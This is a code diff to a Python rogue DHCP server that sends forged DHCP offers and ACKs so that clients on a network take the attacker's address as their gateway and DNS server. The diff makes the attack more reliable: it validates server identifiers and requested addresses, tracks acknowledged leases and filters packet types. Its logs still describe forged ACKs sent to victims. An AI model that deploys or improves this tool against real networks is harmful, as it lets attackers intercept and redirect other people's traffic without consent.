@@ -8,7 +8,7 @@ import time
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 from common import dhcp, iface as ifacemod
-from common.eth import BROADCAST_MAC, build_eth_header
+from common.eth import build_eth_header
 from common.ip import build_ip_header
 from common.rawsock import open_raw_socket, try_parse_dhcp_frame
 from common.udp import build_udp_header
@@ -56,8 +56,8 @@ class RogueDHCPServer:
         self.lease_time = args.lease_time
         self.pool = IPPool(args.pool_start, args.pool_end, exclude={self.attacker_ip})
         self.sock = open_raw_socket(self.iface)
-        self.offered_xids = {}  
-        self.captured = []
+        self.offered_xids = {}
+        self.acknowledged_leases = set()
 
     def _send_dhcp(self, dst_mac: str, xid: int, chaddr: str, yiaddr: str, msg_type: int):
         options = dhcp.build_options(
@@ -100,15 +100,20 @@ class RogueDHCPServer:
         offered_mac, offered_ip = entry
         if offered_mac != chaddr:
             return
-        requested = pkt.get("requested_ip") or pkt.get("ciaddr")
-        if requested not in (offered_ip, "0.0.0.0", None):
+        # A selecting DHCPREQUEST identifies the selected server. Do not ACK
+        # a request intended for another server.
+        if pkt.get("server_id") != self.server_id or pkt.get("requested_ip") != offered_ip:
             return
         self._send_dhcp(chaddr, xid, chaddr, offered_ip, dhcp.ACK)
         latency_ms = (time.perf_counter() - recv_time) * 1000
         log.warning("REQUEST from %s selected OUR offer -> forged ACK (%s) in %.3f ms",
                      chaddr, offered_ip, latency_ms)
-        self.captured.append((chaddr, offered_ip, time.time()))
-        log.warning("VICTIM CAPTURED: mac=%s ip=%s gateway/dns=%s", chaddr, offered_ip, self.gateway)
+        lease_key = (chaddr, offered_ip)
+        if lease_key in self.acknowledged_leases:
+            log.info("Duplicate DHCPREQUEST from %s for %s; ACK re-sent but not counted again", chaddr, offered_ip)
+            return
+        self.acknowledged_leases.add(lease_key)
+        log.warning("LEASE ACKNOWLEDGED (unverified acceptance): mac=%s ip=%s gateway/dns=%s", chaddr, offered_ip, self.gateway)
 
     def run(self):
         log.info("Rogue DHCP server up on %s (attacker_ip=%s mac=%s) - gateway/dns -> %s",
@@ -123,7 +128,7 @@ class RogueDHCPServer:
             if udp["dst_port"] != dhcp.SERVER_PORT:
                 continue 
             pkt = dhcp.parse_dhcp_packet(udp["payload"])
-            if not pkt:
+            if not pkt or pkt["op"] != dhcp.BOOTREQUEST:
                 continue
             if pkt["msg_type"] == dhcp.DISCOVER:
                 self.handle_discover(pkt, recv_time)
